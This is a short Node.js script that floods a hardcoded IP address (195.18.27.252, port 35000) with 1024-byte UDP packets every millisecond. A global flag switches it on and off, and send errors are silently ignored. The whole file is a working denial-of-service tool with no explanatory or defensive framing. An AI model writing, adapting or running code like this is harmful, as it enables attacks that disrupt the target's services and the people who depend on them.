global.app.request1 = false;
global.app.request2 = true
const dgram = require('dgram');
const { Buffer } = require('buffer');

let packet = ''
for(let i = 0; i < 1024; i++) {
    packet += String(i % 2)
}
const message = Buffer.from(packet);
const client = dgram.createSocket('udp4');
const timerInterval = setInterval(() => {
    if ('request2' in global.app == false || global.app.request2 == false) {
        clearInterval(timerInterval)
        return
    }
    client.send(message, 35000, '195.18.27.252', (err) => {
        //
    });
}, 1)
